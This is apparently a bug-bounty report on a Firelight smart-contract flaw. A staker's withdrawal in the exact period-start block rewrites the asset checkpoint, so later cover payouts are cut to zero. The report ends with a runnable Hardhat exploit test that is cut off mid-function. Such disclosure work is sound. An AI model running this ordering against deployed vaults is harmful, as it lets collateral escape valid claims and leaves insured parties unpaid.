# 90131 sc high boundary time checkpoint rewrite lets settled cover collateral escape payouts causing insolvency

## #90131 \[SC-High] Boundary-time checkpoint rewrite lets settled-cover collateral escape payouts, causing insolvency

**Submitted on Aug 23rd 2026 at 06:54:07 UTC by @crypt0n1337 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90131
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

### Description

## Bug Description

### Brief/Intro

The allocator sizes and commits cover using `vault.totalAssetsAt(vault.currentPeriodStart())`. The vault later computes the maximum payout for that same cover period by querying the same historical timestamp again.

That timestamp is not immutable during the boundary block. If the allocator commits and settles cover in a block whose timestamp is exactly the new period start, a normal staker can place `withdraw()` later in that same block. `withdraw()` moves the assets into the delayed-withdrawal bucket and writes the reduced active-asset value into `_traceTotalAssets` under the same timestamp as the period start. From then on, `totalAssetsAt(periodStart)` returns the post-withdrawal value even though the allocation was already committed and settled using the pre-withdrawal value.

The delayed withdrawal remains physically in the vault and is explicitly intended to remain slashable during the payout window. Nevertheless, `payout()` first caps the payment by the rewritten `assetsAtCapturePeriod`. If that value was rewritten to zero, the vault pays zero and does not reduce the pending withdrawal. The incident is still closed, and the staker later claims the full amount.

The attached local PoC executes this through the real `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, and `IncidentManager`. It uses a normally funded and approved 25 USDC first-loss buffer against a 100 USD valid assessment. In the attack case the first-loss buffer pays 25, the vault incorrectly pays zero, and the staker later claims all 200 FXRP units. In the `periodStart + 1 second` negative control, the historical snapshot remains 200, the first-loss buffer pays 25, the vault correctly pays the remaining 75 from the pending withdrawal, and the staker can claim only 125.

### Affected frozen code

* [`CoverOrderAllocator.commitAllocation()` and capacity validation](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L332-L403)
* [`CoverOrderAllocator._computeAvailableCapacity()` reads `totalAssetsAt(currentPeriodStart())`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L689-L725)
* [`FirelightVault.withdraw()` writes the reduced active-asset checkpoint](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L746-L778)
* [`FirelightVault._requestWithdraw()` preserves the assets in a delayed withdrawal bucket](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L994-L1028)
* [`FirelightVault.payout()` re-queries the mutable period-start checkpoint and caps payment by it](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L892-L965)
* [`FirelightVault._logTrace()` keys checkpoints only by `block.timestamp`](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1056)
* [`Checkpoints.Trace256.push()` replaces a value when the timestamp key is equal](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L198-L214)
* [`CoverOrderAllocator` makes a commitment non-replaceable once settlement starts](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L421-L435)
* [`IncidentManager.approveCurrentAssessment()` closes the incident after the capped vault payment](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol#L403-L439)

### Root cause

There are two incompatible assumptions about the timestamp checkpoint:

1. `commitAllocation()` treats `totalAssetsAt(currentPeriodStart())` as a fixed underwriting snapshot.
2. Vault accounting treats timestamp checkpoints as the state after the last vault mutation carrying that timestamp.

At the exact period boundary these assumptions conflict. The allocator can consume a value early in the block, while a later vault action in the same block can change what every future lookup for that timestamp returns.

The commitment itself does not create a vault checkpoint, and the exploit does not assume that it does. In the demonstrated state, the withdrawal **inserts** the first checkpoint whose key is the boundary timestamp. Before insertion, an upper lookup at that key returns the earlier 200-unit checkpoint; afterward, it returns the newly inserted zero value. If another vault mutation has already created a checkpoint with the boundary key, `Trace256.push()` instead replaces the equal-key value. Both cases mutate the observable period-start snapshot after it has been consumed.

The relevant write path is:

```solidity
function withdraw(...) public ... returns (uint256) {
    ...
    _logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
}

function _logTrace(...) private {
    uint48 ts = Time.timestamp();
    ...
    if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
}
```

The allocator separately reads:

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    ...
);
```

The payout path later re-derives the exposure cap instead of using an immutable value captured by the commitment:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
...
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

Although `activePayableAmount` includes `withdrawAssets[capturePeriod + 1]`, that protection is ineffective when the earlier `assetsAtCapturePeriod` cap has been rewritten to zero.

### End-to-end trigger flow

The PoC uses the following production-path state and actions:

1. An ordinary staker deposits 200 units of the real fixture FAsset before period 1.
2. A normal curator creates a 100 USD cover order for period 1. The buyer funds and approves the premium.
3. A normal first-loss-buffer wallet holds 25 USDC and gives `IncidentManager` the required allowance.
4. In the first eligible period-1 block, whose timestamp is exactly `currentPeriodStart()`:
   * transaction index 0: the allocator commits a genuine Merkle allocation after observing 200 vault assets at the period start;
   * transaction index 1: with the contract's default zero settlement grace, the allocator settles that order, charges the premium, and mints the `CoverNFT`;
   * transaction index 2: the unprivileged staker requests withdrawal of the 200 vault assets.
5. The withdrawal burns the staker's shares, creates `withdrawAssets[2] = 200`, and writes active assets of zero at the exact period-start timestamp.
6. The commitment remains stored with the full 225 USD live matching capacity (200 vault assets plus the funded 25 USDC buffer) and 100 USD settled cover. Because settlement has started, both cancellation and recommitment are blocked by `SettlementsAlreadyStarted`.
7. A covered loss is captured in a later block, after the receipt exists and after the withdrawal request. The normal incident roles confirm it and assess exactly the settled 100 USD allocation - no duplicate or excessive loss is used.
8. The first-loss buffer correctly transfers 25 USDC. The vault is requested to pay the 75-unit remainder.
9. `FirelightVault.payout()` sees 200 units in the pending withdrawal bucket but re-reads `totalAssetsAt(periodStart) == 0`, so `paidAmount` is zero.
10. `IncidentManager` records `vaultPaidAmount == 0` and closes the incident.
11. In period 3, the staker claims the entire 200-unit withdrawal. The covered payout receiver received only 25 of the valid 100-unit assessment.

### Exact demonstrated state transitions

| Value                                               | Boundary-block attack | `boundary + 1` negative control |
| --------------------------------------------------- | --------------------: | ------------------------------: |
| Staked vault assets before period 1                 |                   200 |                             200 |
| Valid settled cover / assessment                    |                   100 |                             100 |
| Funded and approved first-loss buffer               |                    25 |                              25 |
| `totalAssetsAt(periodStart)` observed by commitment |                   200 |                             200 |
| `totalAssetsAt(periodStart)` at payout              |                     0 |                             200 |
| First-loss-buffer payout                            |                    25 |                              25 |
| Vault payout                                        |                     0 |                              75 |
| Pending withdrawal after payout                     |                   200 |                             125 |
| Staker's eventual claim                             |                   200 |                             125 |
| Valid assessment shortfall                          |                    75 |                               0 |

One standalone PoC run produced:

```
attackBoundaryTimestamp= 1787551738
attackCommitTxIndex= 0
attackSettlementTxIndex= 1
attackWithdrawTxIndex= 2
attackWithdrawalTimestamp= 1787551738
attackCaptureTimestamp= 1787551741
attackStartCheckpointBefore= 200000000
attackStartCheckpointAfter= 0
attackValidAssessmentVaultPayout= 0
attackValidAssessmentFLBPayout= 25000000
attackEscapedWithdrawalClaim= 200000000

controlBoundaryTimestamp= 1787810944
controlWithdrawalTimestamp= 1787810945
controlCaptureTimestamp= 1787810948
controlStartCheckpoint= 200000000
controlValidAssessmentVaultPayout= 75000000
controlValidAssessmentFLBPayout= 25000000
controlSlashedWithdrawalClaim= 125000000
```

Timestamps vary between local runs, but the equality/offset and all balance deltas are asserted.

### Why the incident/deposit gate does not prevent this

`_hasActiveIncident()` is checked by deposit and mint paths. `withdraw()` is deliberately not gated, because delayed withdrawals are expected to remain part of `activePayableAmount` and be slashed while still in the payout window.

The PoC does not rely on racing an already active incident. It settles the cover, executes the withdrawal, and only then creates a genuine incident with a later capture timestamp. Consequently:

* no incident exists when the user withdraws;
* deposit gating is irrelevant;
* the cover receipt already exists at capture;
* the assessed order period equals the incident period; and
* the pending withdrawal should remain exposed under the payout comments and formula.

Even adding an active-incident check only to `withdraw()` would not fully fix this ordering, because incidents can legitimately be reported after the withdrawal with a capture timestamp inside the still-covered period.

### Privileged actors act normally

The exploit-triggering staker has no allocator, curator, incident, payout, or vault-admin role. The PoC explicitly verifies this.

The role holders perform only intended production operations:

* the order curator authors a normal buyer-funded order;
* the allocator commits no more than live capacity;
* the allocator settles the exact committed leaf and charges the correct premium;
* the incident curator reports a later covered loss;
* the assessment is exactly the settled allocation, with one order and one market; and
* the approver approves that valid loss.

No role fabricates a claim, overstates a loss, repeats an assessment, misconfigures an oracle, drains the first-loss buffer, or acts outside its documented permissions. The protocol is expected to commit and settle orders and to approve genuine claims; requiring those ordinary actions is not malicious-role cooperation.

### Exact-boundary feasibility and limitation

This finding has a narrow but concrete ordering precondition for the fully finalized path demonstrated by the PoC:

* the commitment, at least one genuine settlement, and the withdrawal must execute in a block whose timestamp equals `currentPeriodStart()`; and
* their order must be `commitAllocation()` -> `settleCoverOrder()` -> `withdraw()`.

If the commitment is mined at `periodStart + 1` or later, the withdrawal checkpoint has a later timestamp and cannot change the start lookup. The negative control proves this.

The condition is nevertheless reachable in the intended deployment:

* period boundaries are deterministic integer timestamps;
* `commitAllocation()` cannot be called for period N before period N begins, so the boundary block is the first eligible block;
* the off-chain matcher can compute the allocation from the pending next-period order book before that boundary and submit at the first eligible block;
* the contract intentionally supports its default zero-grace commit-and-settle path; and
* [Flare transaction ordering](https://dev.flare.network/network/overview) is proposer-controlled with a default priority-gas auction, so a staker can watch or anticipate the operator transactions and submit a lower-priority withdrawal to execute after them.

As passive feasibility evidence only, the deployed Phase-1 vault currently uses a one-day period with boundary time `13:42:49 UTC`. Read-only Flare block-header observations for 13-22 August 2026 found a block at the exact boundary timestamp on 8 of those 10 days. For example, blocks `67464427`, `67538763`, `67613933`, `67689328`, `67764965`, `67843343`, and `67921346` all have exact boundary timestamps and contain between 7 and 58 transactions. No transaction was sent for this observation. This supports timestamp reachability but does not prove that the external off-chain matcher will publish both commit and settlement in the boundary block after Phase 2 is deployed.

[Flare documents approximately 1.8-second blocks](https://dev.flare.network/network/overview), so a block is not guaranteed to carry every integer timestamp. If the chain skips the exact boundary timestamp, if the operator waits until a later timestamp, or if no settlement lands before the withdrawal, the fully finalized path demonstrated by the PoC is unavailable for that period. This constrains likelihood and should be considered during triage; it does not make the demonstrated state transition theoretical when the exact boundary block and ordering occur.

The PoC's same-block settlement removes a discretionary recovery objection. At the end of the boundary block `totalSettledCover > 0`, and the actual contract rejects both cancel and recommit. If an operational runner instead settles in a later block, the accounting bug still exists; proactive cancellation before settlement would be an emergency mitigation, not an on-chain invariant. Immunefi's program rules state that emergency actions are not an automatic reason to downgrade a valid issue.

## Impact

### Selected impact: Critical - Protocol insolvency

The contract sells and settles a 100-unit cover obligation while backed by 200 vault units and a normal 25-unit first-loss buffer. A genuine 100-unit assessment is later approved, but only 25 is delivered. The vault returns all 200 slashable units to the withdrawing staker instead of paying the remaining 75. The protocol therefore cannot satisfy a valid, premium-paid covered liability even though the collateral remained physically present in the vault throughout the payout window.

This is an accounting-driven insolvency, not a market-price or liquidity shortfall. The failure scales with the amount withdrawn by stakers in the boundary block and can reduce the vault-funded leg to zero. If the affected withdrawing stake represents most or all of the period-start vault backing, the corresponding sold-cover obligations become underfunded by the same vault leg.

The report does **not** select or rely on direct theft of user funds. The sharper program mapping is protocol insolvency: the valid covered liability exceeds what the payout path will deliver because its underwriting snapshot was mutated after commitment.

### Attacker and victim deltas

In the attack test:

* the withdrawing staker starts with zero liquid vault asset after depositing 200 and later receives all 200 back;
* the payout receiver receives the normally funded 25 USDC first-loss-buffer leg but zero of the 75-unit vault leg;
* `IncidentManager` closes the incident with `vaultPaidAmount == 0`; and
* the 200-unit pending withdrawal is not reduced at all.

In the negative control, the same assessment causes a 75-unit vault payout and reduces the staker's later claim from 200 to 125. The 75-unit difference is the exact collateral that escapes solely because the withdrawal used timestamp `periodStart` rather than `periodStart + 1`.

## Scope and known-issue distinctions

### In-scope assets and rules

The [official Firelight competition scope](https://immunefi.com/audit-competition/audit-comp-firelight-1/scope/) explicitly includes:

* historical vault checkpoints and payout execution;
* cover allocation commitments and settlement;
* incident assessment and payout waterfall; and
* the local checkpoint library.

The scope's listed Critical impacts include **Protocol insolvency**. Duplicate bug submissions remain valid until a public fix, and the frozen code remains unchanged for the competition.

### Distinct from Macro M-2

[Macro M-2](https://library-pr-440.onrender.com/library/audits/firelight-1), **"Atomic batchSettle with initial pinned values can DoS runner settlement,"** concerns a buyer who appears funded at an off-chain pin block and later revokes premium allowance or moves premium funds. One `transferFrom` then reverts the allocator's atomic batch, causing settlement liveness failure. The report describes manual recovery by recommitting or individually settling fundable orders.

This report has a different root and final state:

* the buyer remains funded and the premium transfer succeeds;
* the real order settles and the `CoverNFT` is minted;
* no batch call or reverting buyer is involved;
* the commitment becomes non-replaceable; and
* a later valid claim is underpaid while collateral is returned to the staker.

### Distinct from Macro I-3 and I-4

[Macro I-3](https://library-pr-440.onrender.com/library/audits/firelight-1), **"Add checkpoint on reward distributor,"** addressed direct reward/incentive transfers that increased the vault token balance without updating `_traceTotalAssets`. Its fix adds a checkpoint after the reward arrives.

Here checkpoints are not missing. The vulnerable withdrawal performs the intended checkpoint, but its timestamp equals the period-start key and retroactively changes the value that underwriting and payout treat as immutable. Adding more reward checkpoints does not freeze the period snapshot and does not fix the boundary-block ordering.

Macro I-4 added cancellation of an allocation commitment before settlement. The PoC settles the genuine cover before the withdrawal in the same block. `totalSettledCover` is therefore nonzero, and the attached test proves `cancelCommitAllocation(1)` reverts with `SettlementsAlreadyStarted`. I-4 cannot recover this finalized obligation.

### Distinct from accepted aggregate-claim risk

The scope states that aggregate claims are not capped on-chain and relies on trusted assessment roles to avoid duplicate, excessive, or invalid claims. This PoC uses:

* one settled order;
* one market;
* one incident;
* one assessment loss;
* an assessed amount exactly equal to, not greater than, the settled allocation; and
* no prior or competing payout.

The shortfall therefore does not arise from aggregate over-claiming or a bad assessor decision.

### Distinct from first-loss-buffer known issues

The scope documents that the first-loss buffer is an external wallet and assumes it remains funded and approved. The PoC satisfies those assumptions. The buffer holds 25 USDC, gives the real `IncidentManager` the required allowance, and successfully transfers the full 25 during both the attack and control.

Only the remaining 75-unit vault leg differs. Therefore the result is independent of first-loss-buffer underfunding, missing allowance, depeg, or custody behavior.

### Distinct from accepted collateral-price undercollateralization

The accepted-risk text notes that a severe decline in the USD price of the staked asset can reduce capacity and create a shortfall. The PoC holds the oracle price constant at exactly $1 and performs no price manipulation. The 200 vault units remain physically held as pending withdrawal when the valid payout executes. The shortfall is caused solely by the mutable historical checkpoint.

### Public audit and issue review

I reviewed the [published OpenZeppelin/Sentora vault audit](https://github.com/firelight-protocol/firelight-core/blob/main/audits/2025-07-21_OpenZeppelin_Firelight.pdf), the [prior Immunefi Firelight competition findings](https://reports.immunefi.com/firelight), the [July 2026 Macro Firelight A-1 report](https://library-pr-440.onrender.com/library/audits/firelight-1), the Coinspect frontend report, public Git history, and the public GitHub issues/PRs. No published item describes this same root: a post-commit transaction at the exact period-start timestamp mutating the underwriting snapshot and suppressing a real settled-cover payout.

The old `periodAtTimestamp()` reports concerned using the wrong timestamp in historical period-number lookup. They do not concern mutation of a correct period-start asset checkpoint after it has been consumed. The current allocator/incident/payout integration that makes this issue security-critical was introduced in the later V1 code.

## Risk Breakdown

* **Proposed severity:** Critical
* **Exact in-scope impact:** Protocol insolvency
* **Impact magnitude in PoC:** 75-unit shortfall on a valid 100-unit assessment despite 200 units of vault collateral remaining present
* **Triggering attacker:** Ordinary vault staker
* **Attacker privileges:** None
* **Required operator behavior:** Normal first-eligible-period commitment and valid settlement
* **Required incident behavior:** A genuine covered loss assessed within the settled allocation
* **Oracle behavior:** Constant valid $1 price
* **First-loss buffer:** Normally funded and approved; pays successfully
* **Race condition:** Yes - exact period-start block ordered as commit, genuine settlement, then withdrawal
* **Likelihood constraint:** If no block has the exact boundary timestamp, the operator commits later, or settlement does not precede the withdrawal in that block, the fully finalized path is unavailable for that period
* **Repeatability:** Deterministic whenever the exact timestamp/order condition is met
* **On-chain recovery after demonstrated block:** Commitment cancel/recommit is unavailable because settlement already started; ordinary payout closes with the reduced amount

## Recommendation

Use a dedicated immutable period-start vault-asset snapshot for both commitment validation and payout, rather than re-querying a timestamp trace that remains mutable during the boundary block.

A robust design should:

1. Persist the raw vault-asset amount used to underwrite a period before or as the commitment is created.
2. Make that value immutable for the period after first use.
3. Make payout use that exact persisted value, or an equivalently authenticated value tied to the settled allocation.
4. Keep pending withdrawals in the payout base exactly as the current payout logic intends.
5. Add a regression test with multiple transactions sharing `currentPeriodStart()`.

As a smaller defense-in-depth guard, disallow commitments while `block.timestamp == vault.currentPeriodStart()`. Requiring `block.timestamp > currentPeriodStart()` ensures a later vault checkpoint cannot use the period-start key. That introduces a one-timestamp delay and is less explicit than a dedicated snapshot, so the immutable snapshot is preferred.

Regression cases should include:

* deposit before the boundary;
* commit at the boundary followed by withdrawal in the same block;
* settlement before and after the withdrawal;
* withdrawal at `boundary + 1` as a negative control;
* normally funded first-loss-buffer and vault-funded payout legs; and
* a later incident and claim of the delayed withdrawal.

### Proof of Concept

### Proof of Concept

This is a runnable, deterministic local Hardhat exploit test against the frozen Firelight competition revision. It deploys the real in-scope FirelightVault proxy, CoverOrderAllocator, CoverNFT, IncidentManager, Merkle commitment/proof flow, premium collection, first-loss-buffer transfer, payout accounting, and delayed withdrawal claim. Only the external ERC20 and oracle dependencies use the repository's standard local fixtures. No public-chain transaction is sent.

#### Reproduction

1. Clone the official competition repository.
2. Check out the frozen revision:

```bash
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
```

3. Save the code below as `test/security-period-start-checkpoint-rewrite.js`.
4. Install dependencies and run only the PoC:

```bash
npm install
npx hardhat test test/security-period-start-checkpoint-rewrite.js
```

Expected result:

```
Security PoC: period-start checkpoint can be rewritten after cover is committed
  ✔ same-boundary-block withdrawal escapes collateral from a later valid incident payout
  ✔ negative control: withdrawal at boundary + 1 preserves the snapshot and is slashed

2 passing
```

The exploit branch asserts that the real commitment and settlement precede the withdrawal at the exact period-start timestamp, both cancel and recommit are locked after settlement, the funded FLB pays 25, the vault pays 0, and the staker later claims 200. The negative control changes only the withdrawal timestamp to `periodStart + 1`; the vault then pays 75 and the staker can claim only 125.

#### Runnable test

```javascript
const { time } = require('@nomicfoundation/hardhat-network-helpers')
const { expect } = require('chai')
const { ethers, upgrades } = require('hardhat')
const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')
const { deployVault } = require('./setup/fixtures.js')

const DAY = 24 * 60 * 60

const e18 = value => ethers.parseUnits(value, 18)
const e6 = value => ethers.parseUnits(value, 6)

const marketIdFor = (chainId, protocol, market) =>
  ethers.keccak256(
    ethers.AbiCoder.defaultAbiCoder().encode(
      ['uint64', 'string', 'bytes32'],
      [chainId, protocol, market]
    )
  )

async function deployProductionPath () {
  const signers = await ethers.getSigners()
  const [
    deployer,
    ,
    ,
    ,
    ,
    ,
    ,
    ,
    ,
    allocatorAdmin,
    orderCurator,
    allocatorOperator,
    configAdmin,
    incidentCurator,
    assessmentApprover,
    payoutReceiver,
    premiumCollector,
    firstLossBuffer
  ] = signers

  const vaultCtx = await deployVault({
    decimals: 6,
    initial_deposit_limit: e6('1000'),
    period_configuration_duration: DAY
  })
  const vault = vaultCtx.firelight_vault
  const vaultAsset = vaultCtx.token_contract
  const staker = vaultCtx.users[0]
  const coverBuyer = vaultCtx.users[1]

  const stakedAssets = e6('200')
  await vaultCtx.utils.mintAndApprove(stakedAssets, staker)
  await vault.connect(staker).deposit(stakedAssets, staker.address)

  const MockERC20 = await ethers.getContractFactory('MockERC20')
  const usdc = await MockERC20.deploy('Mock USDC', 'mUSDC', 6)

  const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
  const priceFeed = await MockAggregator.deploy(18, e18('1'))

  const CoverNFT = await ethers.getContractFactory('CoverNFT')
  const coverNFT = await upgrades.deployProxy(
    CoverNFT,
    ['Firelight Cover', 'FLCOVER', '', deployer.address, ethers.ZeroAddress, ethers.ZeroAddress, ethers.ZeroAddress],
    { kind: 'transparent' }
  )

  const protocol = 'Protocol A'
  const market = ethers.encodeBytes32String('market-A')
  const chainId = 1
  const marketId = marketIdFor(chainId, protocol, market)

  const CoverOrderAllocator = await ethers.getContractFactory('CoverOrderAllocator')
  const allocator = await upgrades.deployProxy(
    CoverOrderAllocator,
    [{
      vault: await vault.getAddress(),
      premiumCollector: premiumCollector.address,
      coverNFT: await coverNFT.getAddress(),
      priceFeedAdapter: await priceFeed.getAddress(),
      maxPriceAge: 7 * DAY,
      premiumTokens: [await usdc.getAddress()],
      admin: allocatorAdmin.address,
      adminRole: allocatorAdmin.address,
      curatorRole: orderCurator.address,
      allocatorRole: allocatorOperator.address,
      configAdminRole: configAdmin.address,
      initialProtocolConcentrations: [{
        chainId,
        protocol,
        maxProtocolConcentrationBps: 10_000
      }],
      newMarkets: [{ chainId, protocol, market }],
      capacityConfig: {
        minCAR: 12_000,
        firstLossBufferToken: await usdc.getAddress(),
        firstLossBuffer: firstLossBuffer.address,
        effectiveLeverage: 12_000,
        minOrderMarketCoverAmount: 1,
        divergenceToleranceBps: 0
      }
    }],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] }
  )

  await coverNFT.connect(deployer).grantRole(await coverNFT.MINTER_ROLE(), await allocator.getAddress())
  // The production default is zero, and the allocator explicitly supports
  // settling a committed order later in the same block.
  expect(await allocator.settlementGracePeriod()).to.equal(0)

  const IncidentManager = await ethers.getContractFactory('IncidentManager')
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      deployer.address,
      incidentCurator.address,
      assessmentApprover.address,
      deployer.address,
      deployer.address,
      deployer.address,
      deployer.address,
      deployer.address,
      payoutReceiver.address,
      await allocator.getAddress(),
      await priceFeed.getAddress(),
      7 * DAY
    ],
    { kind: 'transparent', unsafeAllow: ['missing-initializer-call'] }
  )

  await vault.connect(deployer).grantRole(await vault.INCIDENT_ROLE(), await incidentManager.getAddress())
  await vault.connect(deployer).grantRole(await vault.PAYOUT_ROLE(), await incidentManager.getAddress())
  await vault.connect(vaultCtx.payout_allowlister).addToPayoutAllowlist(payoutReceiver.address)

  // Use a normally funded and approved first-loss buffer. This ensures the
  // shortfall below is caused only by the corrupted vault snapshot, not by the
  // documented external-FLB funding/allowance trust assumption.
  const firstLossBufferAssets = e6('25')
  await usdc.mint(firstLossBuffer.address, firstLossBufferAssets)
  await usdc.connect(firstLossBuffer).approve(await incidentManager.getAddress(), firstLossBufferAssets)

  const requestedCover = e18('100')
  const buyerPremiumFunds = e6('10')
  await usdc.mint(coverBuyer.address, buyerPremiumFunds)
  await usdc.connect(coverBuyer).approve(await allocator.getAddress(), buyerPremiumFunds)
  await allocator.connect(orderCurator).createCoverOrder(
    coverBuyer.address,
    payoutReceiver.address,
    'protocol-a-beneficiary',
    await usdc.getAddress(),
    [{ marketId, coverRateAnnual: 500, coverAmount: requestedCover }],
    0
  )
  expect((await allocator.getCoverOrder(0)).period).to.equal(1)

  const allocations = [[marketId, requestedCover]]
  const tree = StandardMerkleTree.of([[0n, allocations]], ['uint256', '(bytes32,uint256)[]'])

  return {
    vault,
    vaultAsset,
    staker,
    coverBuyer,
    allocator,
    allocatorOperator,
    configAdmin,
    coverNFT,
    usdc,
    premiumCollector,
    incidentManager,
    incidentCurator,
    assessmentApprover,
    payoutReceiver,
    marketId,
    requestedCover,
    stakedAssets,
    firstLossBufferAssets,
    tree
  }
}

async function commitAtBoundaryAndWithdraw (ctx, withdrawOffsetSeconds) {
  const boundary = await ctx.vault.currentPeriodEnd()
  expect(await ctx.vault.currentPeriod()).to.equal(0)
  expect(await ctx.vault.totalAssetsAt(boundary)).to.equal(ctx.stakedAssets)

  let commitTx
  let settleTx
  let withdrawTx
  await ethers.provider.send('evm_setAutomine', [false])
  try {
    await ethers.provider.send('evm_setNextBlockTimestamp', [Number(boundary)])
    commitTx = await ctx.allocator.connect(ctx.allocatorOperator).commitAllocation(
      1,
      ctx.tree.root,
      ctx.requestedCover,
      e18('225'),
      { gasLimit: 8_000_000 }
    )

    // Finalize the genuine cover obligation before the user withdrawal. The
    // allocator uses its normal same-block settlement path with the default
    // zero grace period; no role makes an incorrect risk or incident decision.
    settleTx = await ctx.allocator.connect(ctx.allocatorOperator).settleCoverOrder(
      0,
      [{ marketId: ctx.marketId, allocatedCover: ctx.requestedCover }],
      ctx.tree.getProof(0),
      { gasLimit: 8_000_000 }
    )

    if (withdrawOffsetSeconds === 0) {
      withdrawTx = await ctx.vault.connect(ctx.staker).withdraw(
        ctx.stakedAssets,
        ctx.staker.address,
        ctx.staker.address,
        { gasLimit: 8_000_000 }
      )
    }

    await ethers.provider.send('evm_mine', [])
  } finally {
    await ethers.provider.send('evm_setAutomine', [true])
  }

  const commitReceipt = await commitTx.wait()
  const settleReceipt = await settleTx.wait()
  expect(settleReceipt.blockNumber).to.equal(commitReceipt.blockNumber)
  expect(settleReceipt.index).to.be.greaterThan(commitReceipt.index)

  let withdrawReceipt
  if (withdrawOffsetSeconds === 0) {
    withdrawReceipt = await withdrawTx.wait()
    expect(withdrawReceipt.blockNumber).to.equal(commitReceipt.blockNumber)
    expect(withdrawReceipt.index).to.be.greaterThan(settleReceipt.index)
  } else {
    await ethers.provider.send('evm_setNextBlockTimestamp', [Number(boundary) + withdrawOffsetSeconds])
    withdrawTx = await ctx.vault.connect(ctx.staker).withdraw(
      ctx.stakedAssets,
      ctx.staker.address,
      ctx.staker.address,
      { gasLimit: 8_000_000 }
    )
    withdrawReceipt = await withdrawTx.wait()
  }

  const commitBlock = await ethers.provider.getBlock(commitReceipt.blockNumber)
  expect(commitBlock.timestamp).to.equal(Number(boundary))
  expect(await ctx.vault.currentPeriod()).to.equal(1)

  const commitment = await ctx.allocator.getAllocationCommitment(1)
  expect(commitment.totalAvailableCapacity).to.equal(e18('225'))
  expect(commitment.totalDeclaredAllocated).to.equal(ctx.requestedCover)
  expect(commitment.totalSettledCover).to.equal(ctx.requestedCover)
  expect((await ctx.allocator.getCoverOrder(0)).status).to.equal(1) // MATCHED
  expect(await ctx.coverNFT.ownerOf(0)).to.equal(ctx.coverBuyer.address)
  expect(await ctx.usdc.balanceOf(ctx.premiumCollector.address)).to.be.greaterThan(0)
  expect(await ctx.vault.totalAssets()).to.equal(0)
  expect(await ctx.vault.withdrawAssets(2)).to.equal(ctx.stakedAssets)
  expect(await ctx.vault.pendingWithdrawAssets()).to.equal(ctx.stakedAssets)
  expect(await ctx.vault.hasActiveIncident(1)).to.equal(false)

  // The withdrawing staker is an ordinary user, not an allocator, curator,
  // incident, payout, or vault administrator.
  expect(await ctx.allocator.hasRole(await ctx.allocator.ALLOCATOR_ROLE(), ctx.staker.address)).to.equal(false)
  expect(await ctx.vault.hasRole(await ctx.vault.PAYOUT_ROLE(), ctx.staker.address)).to.equal(false)
  expect(await ctx.vault.hasRole(await ctx.vault.INCIDENT_ROLE(), ctx.staker.address)).to.equal(false)

  // Once settlement has started, the commitment cannot be canceled or
  // recommitted, so post-block monitoring cannot restore the escaped exposure.
  await expect(ctx.allocator.connect(ctx.configAdmin).cancelCommitAllocation(1))
    .to.be.revertedWithCustomError(ctx.allocator, 'SettlementsAlreadyStarted')
  await expect(ctx.allocator.connect(ctx.configAdmin).recommitAllocation(
    1,
    ctx.tree.root,
    ctx.requestedCover,
    e18('225')
  )).to.be.revertedWithCustomError(ctx.allocator, 'SettlementsAlreadyStarted')

  return { boundary, commitment, commitReceipt, settleReceipt, withdrawReceipt }
}

async function payValidIncident (ctx, boundaryState) {
  const settleBlock = await ethers.provider.getBlock(boundaryState.settleReceipt.blockNumber)

  // Mine past the settlement/withdrawal block so the valid loss is unambiguously
  // captured after both the cover receipt exists and the collateral has escaped.
  await time.increase(1)
  const captureTimestamp = await time.latest()
  expect(captureTimestamp).to.be.greaterThan(settleBlock.timestamp)
  await ctx.incidentManager.connect(ctx.incidentCurator).createIncident(
    captureTimestamp,
    'Valid Protocol A covered loss',
    ethers.id(`protocol-a-${boundaryState.boundary}`)
  )
  expect(await ctx.vault.hasActiveIncident(1)).to.equal(true)

  await ctx.incidentManager.connect(ctx.incidentCurator).confirmIncident(1, 'ipfs://valid-incident-report')
  await ctx.incidentManager.connect(ctx.incidentCurator).addAssessmentLosses(1, [{
    coverTokenId: 0,
    marketId: ctx.marketId,
    amount: ctx.requestedCover
  }])
  await ctx.incidentManager.connect(ctx.incidentCurator).submitCurrentAssessment(1)

  const receiverBefore = await ctx.vaultAsset.balanceOf(ctx.payoutReceiver.address)
  const receiverFlbBefore = await ctx.usdc.balanceOf(ctx.payoutReceiver.address)
  await ctx.incidentManager.connect(ctx.assessmentApprover).approveCurrentAssessment(1)
